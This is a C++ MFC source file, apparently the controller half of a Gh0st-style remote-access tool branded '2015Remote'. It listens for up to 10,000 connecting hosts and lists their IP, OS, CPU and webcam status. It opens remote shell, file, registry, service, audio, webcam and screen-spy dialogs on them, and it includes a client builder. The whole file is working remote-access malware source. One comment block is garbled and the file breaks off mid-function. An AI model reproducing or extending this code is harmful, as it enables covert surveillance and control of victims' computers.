
// RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "RemoteDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include "IOCPServer.h"
#include"SystemDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "VideoDlg.h"
#include"ServicesDlg.h"
#include "RegisterDlg.h"
#include "ScreenSpyDlg.h"
#include "Common.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//全局变量
CRemoteDlg*  g_RemoteDlg = NULL;
static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING
};
typedef struct
{
	char*   szTitle;           //列表的名称
	int		nWidth;            //列表的宽度
}COLUMNSTRUCT;
COLUMNSTRUCT g_Column_Data_Online[] =
{
	{ "IP",			148 },
	{ "区域",			150 },
	{ "计算机名/备注",	160 },
	{ "操作系统",		128 },
	{ "CPU",			80 },
	{ "摄像头",		81 },
	{ "PING",			151 }
};
COLUMNSTRUCT g_Column_Data_Message[] =
{
	{ "信息类型",		200 },
	{ "时间",			200 },
	{ "信息内容",	    490 }
};
enum
{
	ONLINELIST_IP = 0,          //IP的列顺序
	ONLINELIST_ADDR,          //地址
	ONLINELIST_COMPUTER_NAME, //计算机名/备注
	ONLINELIST_OS,            //操作系统
	ONLINELIST_CPU,           //CPU
	ONLINELIST_VIDEO,         //摄像头(有无)
	ONLINELIST_PING           //PING(对方的网速)
};
int g_Column_Count_Message = 3;   //列表的个数
int  g_Column_Count_Online = 7;
int g_Column_Online_Width = 0;
int g_Column_Message_Width = 0;

IOCPServer* m_IocpServer = NULL;


#define UM_ICONNOTIFY WM_USER+100     //托盘回消息






// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnMainSet();
	
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	ON_COMMAND(ID_MAIN_SET, &CAboutDlg::OnMainSet)
	
END_MESSAGE_MAP()


// CRemoteDlg 对话框



CRemoteDlg::CRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_REMOTE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	m_iCount = 0;

	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);
}

void CRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconotify)
	ON_COMMAND(ID_NOTIFY_EXIT, &CRemoteDlg::OnNotifyExit)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CRemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_MAIN_SET, &CRemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CRemoteDlg::OnMainExit)
	ON_WM_CLOSE()
	ON_COMMAND(IDM_ONLINE_BUILD, &CRemoteDlg::OnOnlineBuildClient)
//	ON_REGISTERED_MESSAGE(WM_USERTOONLINELIST, &CRemoteDlg::OnUsertoonlinelist)
	ON_MESSAGE(WM_USERTOONLINELIST, &CRemoteDlg::OnUsertoonlinelist)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CRemoteDlg::OnOnlineProcess)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, &CRemoteDlg::OnOpensystemdialog)
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CRemoteDlg::OnOnlineMessage)
	ON_MESSAGE(WM_OPENTALKDIALOG, &CRemoteDlg::OnOpentalkdialog)
	ON_COMMAND(ID_ONLINE_DELETE, &CRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_ONLINE_CMD, &CRemoteDlg::OnOnlineCmd)
	ON_MESSAGE(WM_OPENSHELLDIALOG, &CRemoteDlg::OnOpenshelldialog)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CRemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CRemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CRemoteDlg::OnOnlineFileManager)
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, &CRemoteDlg::OnOpenFileManagerDialog)
	
	ON_COMMAND(IDM_ONLINE_AUDIO, &CRemoteDlg::OnOnlineAudioManager)
	ON_MESSAGE(WM_OPENAUDIODIALOG, &CRemoteDlg::OnOpenaudiodialog)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CRemoteDlg::OnOnlineVideoManager)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, &CRemoteDlg::OnOpenVideoDialog)
	ON_COMMAND(IDM_ONLINE_SERVER, &CRemoteDlg::OnOnlineServerManager)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, &CRemoteDlg::OnOpenServicesDialog)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CRemoteDlg::OnOnlineRegisterManager)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, &CRemoteDlg::OnOpenrRegisterDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, &CRemoteDlg::OnOpenScreenspyDialog)
END_MESSAGE_MAP()


// CRemoteDlg 消息处理程序

BOOL CRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	g_RemoteDlg = this;
	//创建工具条
	CreateToolBar();
	//初始化主窗口控件
	InitControl();    
	//初始化状态条
	CreateStatusBar();
	//创建托盘
	CreteNotifyBar();
	//创建菜单
	CreateSolidMenu();
	//监听
	ListenPort();       //未完成





	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


/************************************************************************/
/*  CreateToolBar   创建真彩工具条                                                     */
/************************************************************************/
VOID CRemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{
		
		return;
	}

	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);
	//加载真彩工具条
	m_ToolBar.LoadTrueColorToolBar(
		48,    
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN);

	RECT Rect, RectMain;
	GetWindowRect(&RectMain);   //获得窗口的大小
	Rect.left = 0;
	Rect.top = 0;
	Rect.bottom = 80;
	Rect.right = RectMain.right - RectMain.left + 10;
	m_ToolBar.MoveWindow(&Rect, TRUE);
	m_ToolBar.SetButtonText(0, "终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1, "进程管理");
	m_ToolBar.SetButtonText(2, "窗口管理");
	m_ToolBar.SetButtonText(3, "桌面管理");
	m_ToolBar.SetButtonText(4, "文件管理");
	m_ToolBar.SetButtonText(5, "语音管理");
	m_ToolBar.SetButtonText(6, "视频管理");
	m_ToolBar.SetButtonText(7, "服务管理");
	m_ToolBar.SetButtonText(8, "注册表管理");
	m_ToolBar.SetButtonText(9, "参数设置");
	m_ToolBar.SetButtonText(10, "生成客户端");
	m_ToolBar.SetButtonText(11, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示
	
}

/************************************************************************/
/*      函数： CreateStatusBar                                           */
/*       作用：创建状态栏                                                */
/************************************************************************/
VOID CRemoteDlg::CreateStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
			sizeof(Indicators) / sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return;
	}
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);
}

/************************************************************************/
/*  函数：CreteNotifyBar()                                             */
/*  作用：创建托盘                                                     */
/************************************************************************/
VOID CRemoteDlg::CreteNotifyBar()
{
	m_Nid.cbSize = sizeof(NOTIFYICONDATA);    //大小
	m_Nid.hWnd = m_hWnd;                      //父窗口句柄  
	m_Nid.uID = IDR_MAINFRAME;                  //位图ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	m_Nid.hIcon = m_hIcon;

	CString strTips = "2015Remote远程协助软件.........";       //气泡提示
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
}
VOID CRemoteDlg::CreateSolidMenu()
{
	HMENU hMenu;
	hMenu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU2));
	::SetMenu(this->GetSafeHwnd(), hMenu);
	::DrawMenuBar(this->GetSafeHwnd());
}
/************************************************************************/
/*        函数OnSize                                                              */
/************************************************************************/
void CRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码

	if (m_CList_Online.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top = 80;         //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);


		for (int i = 0; i < g_Column_Count_Online; i++) //遍历每一个列
		{           
			double Temp = g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
			Temp /= g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			m_CList_Online.SetColumnWidth(i, (lenth));       //设置当前的宽度
		}
	}

	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy - 156;     //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 20;   //列表的下坐标
		m_CList_Message.MoveWindow(rc);
		for (int i = 0; i < g_Column_Count_Message; i++) {           //遍历每一个列
			double Temp = g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp /= g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp *= cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                                  //转换为int 类型
			m_CList_Message.SetColumnWidth(i, (lenth));        //设置当前的宽度
		}
	}
	if (m_ToolBar.m_hWnd != NULL)                  //工具条
	{
		CRect rc;
		rc.top = rc.left = 0;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}

	if (m_StatusBar.m_hWnd != NULL) 
	{    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}
}

/************************************************************************/
/*   函数InitControl                                               */
/*   作用：初始化主窗口控件                                       */
/************************************************************************/
VOID CRemoteDlg::InitControl()
{
	CRect Rect;
	GetWindowRect(&Rect);
	Rect.bottom += 20;
	MoveWindow(&Rect);

	for (INT i = 0; i < g_Column_Count_Online;i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle, LVCFMT_CENTER, g_Column_Data_Online[i].nWidth);
		g_Column_Online_Width += g_Column_Data_Online[i].nWidth;
	}

	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle, LVCFMT_CENTER, g_Column_Data_Message[i].nWidth);


		g_Column_Message_Width += g_Column_Data_Message[i].nWidth;
	}

	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	SetTimer(0, 3000, NULL);
}

/************************************************************************/
/* 函数    ListenPort()                                                */
/*  作用   获得监听端口号和最大连接数                                  */
/************************************************************************/
VOID CRemoteDlg::ListenPort()
{
	//获得监听端口号
	INT iPort = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");
	//获得最大连接数
	INT iMaxConnection = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");
	if (iPort == 0)
	{
		iPort = 2356;
	}
	if (iMaxConnection == 0)
	{
		iMaxConnection = 10000;
	}
	Activate(iPort,iMaxConnection);
}
/************************************************************************/
/* 函数    Activate                                                    */
/*  作用： 监听客户端的连接                                            */
/* 参数：iPort 端口号，iMaxConnection 最大连接数                       */
/************************************************************************/
VOID  CRemoteDlg::Activate(INT iPort, INT iMaxConnection)
{
	m_IocpServer = new IOCPServer;

	if (m_IocpServer == NULL)
	{
		return;

	}
	//开始服务
	if (m_IocpServer->StartServer(NotifyProc, iPort))
	{

	}
	CString strTemp;
	strTemp.Format("监听端口: %d成功", iPort);
	ShowMessage(TRUE , strTemp);
}
/************************************************************************/
/* 定时器处理函数                                                                     */
/************************************************************************/
VOID CRemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	switch (nIDEvent)
	{
		case 0:
		{
			//MessageBox("Hello", "Hello", NULL);
			break;
		}
		case 1:
		{
			break;
		}
	}
	CDialogEx::OnTimer(nIDEvent);
}

VOID CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, CONTEXT_OBJECT * ContextObject)
{
	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), strIP);

	m_CList_Online.SetItemText(i, ONLINELIST_ADDR, strAddr);
	m_CList_Online.SetItemText(i, ONLINELIST_COMPUTER_NAME, strPCName);
	m_CList_Online.SetItemText(i, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(i, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(i, ONLINELIST_PING, strPing);

	m_CList_Online.SetItemData(i, (DWORD_PTR)ContextObject);
	ShowMessage(TRUE, strIP + "主机上线");
}

/************************************************************************/
/* 函数:ShowMessage()  消息显示函数                                     */
/************************************************************************/
VOID CRemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CString strIsOk, strTime;
	CTime Timer = CTime::GetCurrentTime();
	strTime = Timer.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOk = "执行成功";
	}
	else
	{
		strIsOk = "执行失败";
	}
	m_CList_Message.InsertItem(0, strIsOk);    //向控件中设置数据
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	if (strMsg.Find("上线") > 0)         //处理上线还是下线消息
	{
		m_iCount++;
	}
	else if (strMsg.Find("下线") > 0)
	{
		m_iCount--;
	}
	else if (strMsg.Find("断开") > 0)
	{
		m_iCount--;
	}

	CString strStatusMsg;
	m_iCount = (m_iCount <= 0 ? 0 : m_iCount);         //防止iCount 有-1的情况
	strStatusMsg.Format("有%d个主机在线", m_iCount);
	
}
/****neText(0, strStatusMsg);   //在状态条上显示文字
********************************************************************/
/* 函数:NotifyProc()                                                    */
/************************************************************************/
VOID CALLBACK CRemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	MessageHandle(ContextObject);
}

VOID CRemoteDlg::MessageHandle(CONTEXT_OBJECT * ContextObject)
{
	if (ContextObject == NULL)
	{
		return ;
	}
	if (ContextObject->v1 > 0)
	{
		switch (ContextObject->v1)
		{
			case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case TALK_DLG:
			{
				CTalkDlg* Dlg = (CTalkDlg*)ContextObject->hDlg;
				Dlg->ShowWindow(SW_SHOW);
				break;
			}
			case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();

				break;
			}
			case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case VIDEO_DLG:
			{
				
				CVideoDlg *Dlg = (CVideoDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		}

		return;
	}
	int a = ContextObject->InDeCompressedBuffer.GetBuffer(0)[0];
	switch (ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
		//上线
		case TOKEN_LOGIN:
		{
			g_RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject);
			break;
		}
		//系统管理
		case TOKEN_PSLIST:
		case TOKEN_WSLIST:
		{
			g_RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		//即时消息
		case TOKEN_TALK_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_SHELL_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_DRIVE_LIST:
		{
			g_RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_AUDIO_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_WEBCAM_BITMAPINFO: 
		{
			g_RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_SERVERLIST:
		{

			g_RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	
		case TOKEN_REGEDIT:
		{
			g_RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_BITMAPINFO:
		{
			g_RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		default:
			break; 
	}
}

VOID CRemoteDlg::SendSeletedCommand(PBYTE szBuffer, ULONG ulLength)
{
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	int a = GetLastError();
	while (Pos)
	{
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		int a = 0;
		m_IocpServer->OnClientPreSending(ContextObject, szBuffer, ulLength);

	}
}


/************************************************************************/
/* 函数 OnIconotify()                                                   */
/*  作用： 设置托盘的菜单                                               */
/************************************************************************/
afx_msg LRESULT CRemoteDlg::OnIconotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())
		{
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}

	case WM_RBUTTONDOWN:
	{
		CMenu Menu;
		Menu.LoadMenu(IDR_MENU1);
		CPoint Point;
		GetCursorPos(&Point);
		SetForegroundWindow();   //设置当前窗口
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			Point.x, Point.y, this, NULL);

		break;
	}

	}
	return 0;
}

/************************************************************************/
/* 函数OnNotifyExit()                                                  */
/* 作用：托盘菜单退出                                                  */
/************************************************************************/
void CRemoteDlg::OnNotifyExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);
}

/************************************************************************/
/* 函数OnNotifyShow()                                              */
/*  作用：托盘菜单显示*/
/************************************************************************/
void CRemoteDlg::OnNotifyShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
}


void CAboutDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	
}

/************************************************************************/
/* 函数：OnMainSet()             菜单消息处理函数                       */
/************************************************************************/
void CRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

/************************************************************************/
/* 函数：OnMainSet()             菜单消息处理函数                       */
/************************************************************************/
void CRemoteDlg::OnMainExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);
}

/************************************************************************/
/* 函数void CRemoteDlg::OnClose()  关闭窗口                            */
/************************************************************************/
void CRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	KillTimer(0);
	if (::MessageBox(NULL, "ヾ(￣▽￣)Bye~Bye~", "Remote", MB_OKCANCEL) == 1)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_Nid);


		if (m_IocpServer != NULL)
		{
			delete m_IocpServer;
			m_IocpServer = NULL;
		}
		CDialogEx::OnClose();
	}
	
}


void CRemoteDlg::OnOnlineBuildClient()
{
	// TODO: 在此添加命令处理程序代码
	CBuildDlg Dlg;
	Dlg.DoModal();
}


//afx_msg LRESULT CRemoteDlg::OnUsertoonlinelist(WPARAM wParam, LPARAM lParam)
//{
//	return 0;
//}


afx_msg LRESULT CRemoteDlg::OnUsertoonlinelist(WPARAM wParam, LPARAM lParam)
{
	CString strIp, strAddr, strPcName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	if (ContextObject == NULL)
	{
		return -1;
	}
	CString strToolTipsText;
	try
	{
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			return -1;
		}
		//得客户端的信息
		LOGIN_INFOR* LoginInfor = (LOGIN_INFOR*)ContextObject->InDeCompressedBuffer.GetBuffer();
		sockaddr_in ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAsddrLen = sizeof(ClientAddr);
		BOOL bOk = getpeername(ContextObject->ClientSocket, (SOCKADDR*)&ClientAddr, &iClientAsddrLen);

		strIp = inet_ntoa(ClientAddr.sin_addr);

		strPcName = LoginInfor->szPCName;

		switch (LoginInfor->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfor->OsVerInfoEx.dwMajorVersion <= 4)
				strOS = "WindowsNT";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0)
				strOS = "Windows2000";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1)
				strOS = "WindowsXP";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2)
				strOS = "Windows2003";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0)
				strOS = "WindowsVista";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1)
				strOS = "Windows7";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2)
				strOS = "Windows8";
		}
		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);

		//网速
		strPing.Format("%d", LoginInfor->dwSpeed);



		strVideo = LoginInfor->bWebCamIsExist ? "有" : "无";



		AddList(strIp, strAddr, strPcName, strOS, strCPU, strVideo, strPing, ContextObject);
	}
	catch (...){}
	
}


void CRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_SYSTEM;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpensystemdialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	CSystemDlg* Dlg = new CSystemDlg(this, m_IocpServer, ContextObject);

	ContextObject->v1 = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;
	//创建非阻塞的对话框
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	
	return 0;
}


void CRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);
	CMenu* SubMenu = Menu.GetSubMenu(0);

	CPoint Point;
	GetCursorPos(&Point);

	int iCount = SubMenu->GetMenuItemCount();

	if (m_CList_Online.GetSelectedCount() == 0)
	{
		for (int i = 0;i < iCount;i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);


	*pResult = 0;
}


void CRemoteDlg::OnOnlineMessage()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_TALK;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpentalkdialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	CTalkDlg *Dlg = new CTalkDlg(this, m_IocpServer, ContextObject);

